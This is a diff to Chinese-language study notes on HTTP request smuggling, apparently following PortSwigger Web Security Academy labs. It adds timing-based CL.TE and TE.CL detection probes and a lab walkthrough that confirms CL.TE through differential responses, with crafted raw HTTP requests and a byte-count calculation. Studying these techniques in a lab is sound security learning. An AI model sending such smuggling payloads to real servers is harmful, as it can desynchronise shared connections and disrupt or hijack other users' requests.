@@ -430,6 +430,176 @@ Only11Bytes
 
 發送兩次，成功解題～
 
+## Finding CL.TE vulnerabilities using timing techniques
+
+PoC
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+Frontend 發送給 Backend 的 Raw HTTP Request
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+```
+
+Backend 等不到 TE 的結尾 `0\r\n` => timeout
+
+## Finding TE.CL vulnerabilities using timing techniques
+
+PoC
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+Frontend 發送給 Backend 的 Raw HTTP Request
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+
+```
+
+Backend 等不到 CL 的結尾 => timeout
+
+## You should use CL.TE first
+
+如果對 CL.TE 的系統使用 TE.CL 會發生
+
+PoC
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+Frontend 原封不動發送給 Backend，Backend 解析完
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+
+```
+
+X => 留在 unprocessed => 下一個用戶可能無法正常訪問
+
+是說，我怎麼覺得這個概念應該安排在 [Lab: HTTP request smuggling, obfuscating the TE header](#lab-http-request-smuggling-obfuscating-the-te-header) 之前，因為這題其實也需要去測試，是 CL.TE 還是 TE.CL
+
+##
+
+| Dimension | Description                                                                                                                  |
+| --------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/finding#confirming-cl-te-vulnerabilities-using-differential-responses |
+| Lab       | https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses               |
+
+第一次
+
+```
+POST / HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 107
+
+0
+
+POST /404 HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+Content-Length: 84
+
+
+```
+
+Frontend 原封不動發送給 Backend，Backend 解析完
+
+```
+POST / HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 107
+
+0
+
+
+```
+
+然後這些留在 unprocess
+
+```
+POST /404 HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+Content-Length: 84
+
+
+```
+
+第二次剛好精準送 84 bytes
+
+```
+POST / HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+
+
+```
+
+第二次完整的 Raw HTTP Request
+
+```
+POST /404 HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+Content-Length: 84
+
+POST / HTTP/1.1
+Host: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net
+
+
+```
+
+84 如何算出來的
+
+```ts
+Buffer.byteLength(
+  `POST / HTTP/1.1\r\nHost: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net\r\n\r\n`,
+);
+```
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
